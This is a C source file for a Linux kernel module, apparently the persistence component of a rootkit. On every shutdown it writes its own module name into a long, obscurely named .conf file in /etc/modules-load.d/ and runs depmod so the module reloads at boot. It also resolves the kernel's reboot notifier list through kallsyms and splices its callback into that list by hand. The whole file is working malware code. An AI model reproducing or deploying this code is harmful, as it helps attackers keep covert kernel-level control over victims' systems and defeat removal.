#include "persistency.h"

#include <linux/string.h>
#include <linux/gfp.h>
#include <linux/slab.h>
#include <linux/module.h>
#include <linux/notifier.h>
#include <linux/kallsyms.h>
#include <linux/umh.h>

#include "file.h"
#include "const.h"
#include "hash.h"

#define MODULES_BOOT_CONF_DIR "/etc/modules-load.d/"
#define BOOT_FILE_EXTENSION ".conf"
#define MAX_FILENAME_LENGTH 255

int shutdown_notifier(struct notifier_block *nb, unsigned long action, void *data) {
    char* md5 = register_for_boot();
    kfree(md5);
    return NOTIFY_OK;
}

char* get_file_name(void){
    int i = 0;
    size_t boot_file_extension_len;
    char* file_name = kmalloc(MAX_FILENAME_LENGTH + 1, GFP_KERNEL);
    memset(file_name, 0, MAX_FILENAME_LENGTH + 1);
    boot_file_extension_len = strlen(BOOT_FILE_EXTENSION);
    memcpy(file_name + MAX_FILENAME_LENGTH - boot_file_extension_len, BOOT_FILE_EXTENSION, boot_file_extension_len);
    for (; i < MAX_FILENAME_LENGTH - boot_file_extension_len; ++i){
        file_name[i] = 'a';
    }
    return file_name;
}

char* register_for_boot() {
    struct file* file;
    char* md5 = NULL;
    char *hargv[] = {DEPMOD_PATH, "-a", NULL};
    char *henvp[] = {"HOME=/", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL};
    char* file_name = get_file_name();
    char* file_full_path = kmalloc(strlen(MODULES_BOOT_CONF_DIR) + strlen(file_name) + 1, GFP_KERNEL);
    memset(file_full_path, 0, strlen(MODULES_BOOT_CONF_DIR) + strlen(file_name) + 1);
    memcpy(file_full_path, MODULES_BOOT_CONF_DIR, strlen(MODULES_BOOT_CONF_DIR));
    memcpy(file_full_path + strlen(MODULES_BOOT_CONF_DIR), file_name, strlen(file_name));

    printk("%s\n", file_name);
    printk("%s\n", file_full_path);
    
    file = file_open(file_full_path, O_CREAT | O_RDWR | O_TRUNC, 0);
    if (NULL == file) {
        goto release_resources;
    }
    if (strlen(THIS_MODULE->name) != file_write(file, 0,  THIS_MODULE->name, strlen(THIS_MODULE->name))) {
        printk("Failed register for boot\n");
    }
    else {
        md5 = get_md5(THIS_MODULE->name, strlen(THIS_MODULE->name));
    }
    call_usermodehelper(DEPMOD_PATH, hargv, henvp, UMH_WAIT_PROC);
    file_close(file);
release_resources:
    kfree(file_name);
    kfree(file_full_path);
    return md5;
}

void register_for_shutdown(){
    struct blocking_notifier_head* reboot_notifier_list = (struct blocking_notifier_head*)kallsyms_lookup_name("reboot_notifier_list");
    struct notifier_block* notifier_ptr;
    struct notifier_block* notifier = kmalloc(sizeof(struct notifier_block), GFP_KERNEL);
    notifier->next = NULL;
    notifier->notifier_call = shutdown_notifier;
    notifier->priority = 0;
    notifier_ptr = reboot_notifier_list->head;
    if (NULL == notifier_ptr) {
        reboot_notifier_list->head = notifier;
    }
    else {
        while (NULL != notifier_ptr->next){
            notifier_ptr = notifier_ptr->next;
        }
        notifier_ptr->next = notifier;    
    }
}